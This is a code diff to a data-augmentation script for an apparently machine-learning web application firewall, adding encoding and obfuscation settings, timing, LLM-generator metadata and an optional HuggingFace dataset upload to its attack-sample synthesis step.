+        log.info(f"LlmGenerator enabled: provider={llm_cfg.provider}")
     else:
-        log.info("LocalLLMGenerator skipped (no model path / model not found)")
+        log.info("LlmGenerator skipped (no provider configured or local model path not found)")
 
     governor = AugmentationGovernor(
         inventory_path=inventory_path,
         target_per_class=target,
         generators=generators,
         chain_len=chain_len,
+        double_encode_prob=double_encode_prob,
+        double_obfuscate_prob=double_obfuscate_prob,
         rng_seed=cfg.project.seed,
     )
 
-    gaps = governor.gaps()
+    timer = StepTimer()
+
+    with timer.step("gap_analysis"):
+        gaps = governor.gaps()
     if not gaps:
         log.info("All classes meet the target — no augmentation needed.")
         return
 
     stats:        dict[str, int] = {}
     all_records:  list[HttpRecord] = []
-    rng = random.Random(cfg.project.seed)
 
     def _synthesize_and_wrap(attack_class: str, n_needed: int) -> list[HttpRecord]:
-        payloads = governor.synthesize_class(attack_class, n_needed)
-        source   = f"aug_synthesis_{attack_class}"
-        records  = []
-        for p in payloads:
-            r = _payload_to_record(p, attack_class, source, rng)
-            if r:
-                records.append(r)
+        with timer.step(f"synthesis_{attack_class}"):
+            tagged = governor.synthesize_class(attack_class, n_needed)
+            records = []
+            for payload, gen_name in tagged:
+                source = f"aug_synthesis_{gen_name}_{attack_class}"
+                r = _payload_to_record(payload, attack_class, source)
+                if r:
+                    records.append(r)
         log.info(f"  {attack_class:15s}: {len(records):,}/{n_needed:,} valid records generated")
         return records
 
     # Parallel generation (one thread per attack class)
-    max_workers = min(len(gaps), 4)
-    with ThreadPoolExecutor(max_workers=max_workers) as pool:
-        futures = {
-            pool.submit(_synthesize_and_wrap, cls, n): cls
-            for cls, n in gaps.items()
-        }
-        for future in as_completed(futures):
-            cls     = futures[future]
-            records = future.result()
-            stats[cls]   = len(records)
-            all_records += records
+    max_workers = min(len(gaps), len(GRAMMAR_REGISTRY))
+    with timer.step("synthesis_total"):
+        with Progress(SpinnerColumn(), "[progress.description]{task.description}",
+                      BarColumn(), MofNCompleteColumn(), TimeElapsedColumn()) as prog:
+            task = prog.add_task("Synthesizing attack classes", total=len(gaps))
+            with ThreadPoolExecutor(max_workers=max_workers) as pool:
+                futures = {
+                    pool.submit(_synthesize_and_wrap, cls, n): cls
+                    for cls, n in gaps.items()
+                }
+                for future in as_completed(futures):
+                    cls     = futures[future]
+                    records = future.result()
+                    stats[cls]   = len(records)
+                    all_records += records
+                    prog.advance(task)
 
     # Write output
     if all_records:
         out_path = out_dir / "synthesized_attacks.parquet"
-        pq.write_table(records_to_table(all_records), out_path, compression="snappy")
+        with timer.step("parquet_write"):
+            pq.write_table(records_to_table(all_records), out_path, compression="snappy")
         log.info(f"Wrote {len(all_records):,} records → {out_path}")
+
+    llm_gen    = next((g for g in generators if g.name == "llm"), None)
+    llm_provider = llm_cfg.provider if llm_gen else "none"
+    llm_model    = llm_cfg.model    if llm_gen else "none"
 
     stats_path = Path(cfg.paths.reports) / "metrics" / "augmentation_synthesis.json"
     stats_path.parent.mkdir(parents=True, exist_ok=True)
     stats_path.write_text(json.dumps({
-        "target_per_class": target,
-        "chain_length":     chain_len,
-        "generators_used":  [g.name for g in generators],
-        "gaps_filled":      stats,
-        "total_generated":  len(all_records),
+        "target_per_class":      target,
+        "chain_length":          chain_len,
+        "double_encode_prob":    double_encode_prob,
+        "double_obfuscate_prob": double_obfuscate_prob,
+        "generators_used":       [g.name for g in generators],
+        "llm_provider":          llm_provider,
+        "llm_model":             llm_model,
+        "gaps_filled":           stats,
+        "total_generated":       len(all_records),
+        "timings_s":             timer.timings,
     }, indent=2))
     log.info(f"Synthesis complete: {len(all_records):,} total records across {len(stats)} classes")
 
@@ -639,20 +961,39 @@ def run(args: argparse.Namespace) -> None:
                 "chain_length":     chain_len,
                 "generators_used":  [g.name for g in generators],
                 "n_classes_filled": len(stats),
+                "llm_provider":     llm_provider,
+                "llm_model":        llm_model,
             })
             metrics: dict[str, float] = {"total_generated": float(len(all_records))}
             for cls, n in stats.items():
                 metrics[f"generated_{cls}"] = float(n)
             log_metrics_dict(metrics)
+            timer.log_mlflow()
             mlflow.log_artifact(str(stats_path))
     except Exception as exc:
         log.warning(f"MLflow logging skipped: {exc}", exc_info=True)
+
+    if args.save:
+        from ai_waf_v2.utils.hub import push_folder
+        push_folder(
+            cfg,
+            folder=Path(cfg.paths.data_augmented) / "synthesis",
+            repo_key="dataset_synthesis",
+            repo_type="dataset",
+            commit_message=f"Stage 3.1 synthesis: {len(all_records):,} records",
+            revision=args.revision,
+            dry_run=args.dry_run,
+        )
 
 
 def parse_args() -> argparse.Namespace:
     p = argparse.ArgumentParser()
     p.add_argument("--config",     default="config/pipeline.yaml")
     p.add_argument("--model-path", default=None, help="Path to local GGUF model (optional)")
+    p.add_argument("--force",    action="store_true", help="Re-run even if outputs already exist")
+    p.add_argument("--save",     action="store_true", help="Push outputs to HuggingFace Hub")
+    p.add_argument("--revision", default="main",     help="HuggingFace revision/tag (default: main)")
+    p.add_argument("--dry-run",  action="store_true", help="Preview hub push without uploading")
     return p.parse_args()
 
 
